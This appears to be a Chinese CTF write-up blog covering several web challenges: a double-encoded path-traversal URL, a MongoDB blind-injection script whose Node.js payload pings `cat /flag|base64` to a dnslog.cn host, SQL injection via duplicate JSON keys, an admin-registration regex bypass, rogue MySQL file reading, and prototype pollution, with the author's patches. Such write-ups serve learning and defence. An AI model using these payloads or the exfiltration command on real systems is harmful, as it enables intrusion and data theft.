<p>十分可惜，这个isdanger是在engine启动前，根据nginx解析get变量后进行判断的，由于我们对<code>?</code>进行了编码绕过了nginx的变量解析，所以nginx传给php-fpm的<code>$_GET</code>是空的，自然能绕过isdanger。</p>
<p>又因为这个框架对url的解析只认最后一个斜杠，如果我们正常写<code>data=../../../flag</code>的话会被框架解析为<code>/flag</code>路由，如果写<code>data=..%2f..%2f..%2fflag</code>也没用，因为被nginx解码之后回去还是会变成<code>../</code>。    </p>
<p>继续追踪<code>net/Request.php</code>，这里多此一举的再次对url进行了解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;url)) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Merge URL query parameters with $_GET</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_GET</span> += <span class="built_in">self</span>::parseQuery(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;query-&gt;setData(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，对<code>$this-&gt;url</code>再次进行了解析，之前骗过nginx的get请求此时被解析了出来，会把第二次解析的内容放入<code>$this-&gt;query-&gt;data</code>里，所以进到最后一步里，data就理所应当的被赋值进来了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;render(<span class="string">&quot;admin&quot;</span>,[<span class="string">&quot;data&quot;</span>=&gt;<span class="string">&quot;./&quot;</span>.<span class="variable">$request</span>-&gt;query-&gt;data],<span class="string">&quot;body_content&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>至此，我们思路很清晰了，对<code>../</code>进行二次编码<code>..%252f</code>，第一次解码是在nginx层，解码为<code>..%2f</code>后传给php-fpm，这个不会被当成<code>/</code>，所以<code>$request-&gt;url</code>不变，第二次解码是在<code>request.php</code>中的<code>init</code>中，解完之后<code>$_GET[data]</code>就是<code>../</code>了，我们就能任意路径穿越去读文件了。</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://124.71.132.232:60080/..%2f/admin%3flogin=&amp;data=..%252f..%252f..%252f..%252fflag</span><br></pre></td></tr></table></figure>
<p>事后总结一下这个题为什么能这么搞，第一点比较离谱的就是框架在解析路由的时候只认了最后一个<code>/</code>的东西，这种bug我也很是服气。剩下的就是nginx和这个框架的配合失误，他自己把很多事情（比如nginx已经给你解析好的东西）都会自己再处理一遍，才导致的这种二次编码绕过漏洞。</p>
<h2 id="candyshop"><a href="#candyshop" class="headerlink" title="candyshop"></a>candyshop</h2><p>审计源码发现是mongoDB,找到了一篇巨佬的博客<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/，里面有对于MongoDB的布尔盲注，盲注后拿到密码，登进去后发现order填写中并未进行任何过滤，所以考虑闭合右括号然后任意js代码执行，这里的执行没有回显，所以我们直接用dnslog进行数据外带即可。">https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/，里面有对于MongoDB的布尔盲注，盲注后拿到密码，登进去后发现order填写中并未进行任何过滤，所以考虑闭合右括号然后任意js代码执行，这里的执行没有回显，所以我们直接用dnslog进行数据外带即可。</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://123.60.21.23:23333&quot;</span></span><br><span class="line">strlist = string.ascii_lowercase + string.digits</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPass</span>():</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> strlist:</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&#x27;^&#x27;</span> + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url+<span class="string">&#x27;/user/login&#x27;</span>, data=post_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You Bad Bad&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] %s&quot;</span> % (password + c))</span><br><span class="line">                password += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">64</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    s.post(url + <span class="string">&#x27;/user/login&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:password&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/shop/order&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;&#x27;)\n                                -[][\&quot;constructor\&quot;][\&quot;constructor\&quot;](\&quot;console.log(this.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;ping `cat /flag|base64`.lww0py.dnslog.cn&#x27;))\&quot;)()\n                                //&quot;</span>, <span class="string">&#x27;candyname&#x27;</span>:<span class="string">&#x27;bunny_candy&#x27;</span>, <span class="string">&#x27;address&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getPass()</span><br><span class="line">    login()</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>greatwall2021</title>
    <url>/2021/10/12/greatwall2021/</url>
    <content><![CDATA[<h1 id="长城杯2021决赛"><a href="#长城杯2021决赛" class="headerlink" title="长城杯2021决赛"></a>长城杯2021决赛</h1><p>10月11号比的赛，9号才知道自己进了靠着顺延进了线下，战队因为没人想去最后被拉去打awdp了，这是第一次打awdp，题目质量挺高的，比赛过程中踩了很多坑，但是收获很大的~感谢我的师父elegant-crazy和队友triplewings，算是一次难忘的线下经历！</p>
<span id="more"></span>
<h2 id="fancyapi"><a href="#fancyapi" class="headerlink" title="fancyapi"></a>fancyapi</h2><p>源码里有两个文件夹，一个是python，一个是go，经过阅读代码发现内网环境有两个服务，内网端口8000是python开的，映射到对外端口；内网端口5000是一个go服务。这个python代码就相当于一个中转站，接受外网的请求，经过自己的一些处理后转发给go，让go进行最底层的处理。</p>
<p>关键代码为go中的<code>backend.go</code>:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id  <span class="keyword">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">	Name <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Votes <span class="keyword">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">	ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">	res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> pl Language</span><br><span class="line">		_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">		res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">	votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">	rows, err := db.Sqlite.Query(query)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> pl Language</span><br><span class="line">		_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">		res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">	action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> secret <span class="keyword">string</span></span><br><span class="line">	row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">		data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="keyword">string</span>(data)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>路由中的/flag里面get两个参数，<code>?action=readFlag&amp;token=xxxxx</code>如果token对了的话就会拿到flag，怎么拿token也是很容易发现的，<code>query := fmt.Sprintf(&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#39;%s&#39;;&quot;, votes, name)</code>存在sql注入漏洞，所以这题思路很明确，sql注入拿到token，然后直接readflag。</p>
<p>然后是python服务中的<code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listAll</span>():</span></span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> data[<span class="string">&#x27;name&#x27;</span>]):</span><br><span class="line">                    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">healthCheck</span>():</span></span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很不巧，我们刚才的思路全被这个python打断了，原因有二：</p>
<ul>
<li>直接检测如果url里get了<code>action=readFlag</code>就给打断了</li>
<li><code>/search</code>里对json进行了严格过滤，name必须是<code>isalnum()</code>（只能是字母和数字），votes必须是数字，这个也把sql注入的问题给修好了</li>
</ul>
<p><code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code>这种路由定义的是一种叫path的类型的path，查阅官方文档，path like the default but also accepts slashes，是一种允许斜杠的路径，也就是说任何路由都会匹配进这个handle函数里，这不禁让我们想到了rctf2021的那个easyphp，利用nginx转发给php-fpm这个中间过程能够进行一些编码绕过，于是在这里也尝试对?进行url编码，payload为<code>/flag%3faction=readFlag&amp;token=</code>，这样在python层面，<code>%3f</code>会经过一层编码，会理解成url而不是get标志，整个path的内容也是<code>/flag?action=readFlag&amp;token</code>而<code>action = request.args.get(&#39;action&#39;)</code>就无法获取到readFlag的内容，这个请求被转发到了GO，GO的处理器就会认识？了，就会把action=readFlag解析到了，于是我们绕过了第一层，开始看第二层的sql注入。</p>
<p>由于python层面已经把name和vote的类型限制死了，我们尝试构造含有两个name参数的json，看看python和go对这个json的理解是否相同。{“vote”:0,”name”:”java”,”name”:”‘’”}发现，在python的理解里，会认识json的第一个name，而在go会认为是json的第二个name，于是我们构造在第一个name输入正常的字符串，在第二个name里构造sql语句进行注入即可，比赛的时候用的是联合注入。</p>
<p>最终的payload：（我也记得不太清了）<code>&#123;&quot;vote&quot;:0,&quot;name&quot;:&quot;java&quot;,&quot;name&quot;:&quot;java&#39; union select 1,secret,1 from token where &#39;1&#39;=&#39;1&quot;&#125;</code>，就能拿到token了，之后带着token访问<code>/flag%3faction=readFlag&amp;token=</code>就好了。</p>
<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>比赛的时候起了个简单的flask项目做实验，发现只要检查path就好，我传进来<code>/flag%3faction=readFlag&amp;token=</code>会被python解析为path=<code>/flag?action=readFlag&amp;token=</code></p>
<p>所以直接把readFlag在path里禁了就好。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> <span class="keyword">or</span> <span class="string">&#x27;readFlag&#x27;</span> <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="work"><a href="#work" class="headerlink" title="work"></a>work</h2><p>一道java题，用的是springboot，幸好假期有一丢丢springboot的开发经验，看起来就快了很多。直接看关键代码，有几个比较关键的代码login，register和adminmanager，adminmanager要求session是admin，所以第一步是用admin登进去。然后仔细看login和register都是通过一种很屑的方式进行注册和登录，直接<code>?user=&#123;&quot;username&quot;:&quot;hacker&quot;,&quot;password&quot;:&quot;guess&quot;&#125;</code>，但这样会400bad request，url编码一下<code>?user=%7b%22username%22%3a%22hacker%22%2c%22password%22%3a%22guess%22%7d</code>就能注册一个叫hacker的用户了。如何注册admin呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern pattern = Pattern.compile(<span class="string">&quot;\&quot;username\&quot;\:\&quot;(.*?)\&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>register代码会进行一个正则过滤，把抓到的部分替换成username:hacker，这样不让你注册admin，绕过也很简单，直接在username:admin前加个空格就能绕了，之后直接<code>?user=%7b%22username%22%3a%22%20admin%22%2c%22password%22%3a%22guess%22%7d</code>就能注册管理员了。</p>
<p>进到adminmanager里，我们可控的参数是url，name和pwd，url要填jdbc的url，name和pwd都是你连的数据库的用户名和密码，我们在register里看到了这样的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JdbcUtils jdbcUtils = <span class="keyword">new</span> JdbcUtils(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/www?serverTimezone=UTC&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>大概就是链接本地的mysql然后读取所有的用户名密码，还会读取一下<code>/tmp/admin</code>的文件内容。</p>
<p>能任意控制jdbc连接了，我们就用rogue mysql server在本地搭建一个恶意mysql服务器，控制靶机连进来，然后就能任意文件读了。</p>
<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>修改正则，在冒号前允许空白字符的出现，就能禁止用户注册了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern pattern = Pattern.compile(<span class="string">&quot;\&quot;username\&quot;\b*\:\b*\&quot;(.*?)\&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="quotes"><a href="#quotes" class="headerlink" title="quotes"></a>quotes</h2><p>nodejs题，上来在<code>router/index.js</code>里写了就看到了触动dna的代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(infos) &amp;&amp; infos.length) &#123;</span><br><span class="line">    infos.forEach(<span class="function">(<span class="params">info, id</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> quote = &#123; <span class="attr">id</span>: id + <span class="number">1</span> &#125;;</span><br><span class="line">        <span class="built_in">Object</span>.keys(info).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">            utils.set(quote, key, info[key]);</span><br><span class="line">        &#125;);</span><br><span class="line">        quotes.push(quote);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到set就大概率原型链污染了，但是<code>utils.js</code>又看到了更脑溢血的一幕</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> banWords = [</span><br><span class="line">    <span class="regexp">/constructor/i</span>,</span><br><span class="line">    <span class="regexp">/prototype/i</span>,</span><br><span class="line">    <span class="regexp">/__proto__/i</span>,</span><br><span class="line">    <span class="regexp">/flag/i</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> set = <span class="function">(<span class="params">object, path, val, obj</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="regexp">/^(__proto__|constructor|prototype).*$/</span>.test(path) &amp;&amp; ((path = path.split ? path.split(<span class="string">&#x27;.&#x27;</span>) : path.slice(<span class="number">0</span>)).slice(<span class="number">0</span>, -<span class="number">1</span>).reduce( <span class="function">(<span class="params">obj, p</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">    &#125;, obj = object)[path.pop()] = val), object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比完赛后问天枢，天枢告诉我就是原型链污染，但是要绕过，就利用下面的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> check = <span class="function">(<span class="params">input</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> percentEncoded = <span class="regexp">/%[a-fA-F0-9]&#123;2&#125;/i</span>.test(input);</span><br><span class="line">    <span class="keyword">if</span> (percentEncoded) &#123;</span><br><span class="line">        <span class="keyword">return</span> check(<span class="built_in">decodeURIComponent</span>(input));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> bad <span class="keyword">of</span> banWords) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bad.test(input)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用%ff让decodeURIComponent失败，就能绕了（又是一个没听说过的姿势）</p>
<p>原型链污染后估计还是得用redis去RCE（可惜没环境没法复现了。</p>
<h2 id="整体复盘"><a href="#整体复盘" class="headerlink" title="整体复盘"></a>整体复盘</h2><p>三道web三道pwn，队友神速patch好了两道pwn，俩web狗先是找到了fancyapi的洞，我负责修，elegant-crazy负责继续往下打，但是发现死活修不对，我十分肯定的是我源码修的绝对没有问题，就是那个<code>update.sh</code>，由于之前从来没打过awdp，以为就是国赛的break&amp;fix一样替换一下代码然后运行一下某个shell script就好了，结果发现不是，我需要先pkill掉正在运行的web进程，然后替换代码，最后再重新起web服务，但是我又无法接触靶机，又不知道我这种执行方式能不能让web服务起来，只能通过平台告诉我的“exp利用成功”告诉我写的有问题，就这样荒废了每道题仅有的十次修补机会。</p>
<p>比完赛后问天枢，告诉我们首先要python3而不是python（这是他们问主办方的），然后还要nohup后台运行，否则那个check脚本就会一直卡住，听了之后人都傻了，居然还要这样。</p>
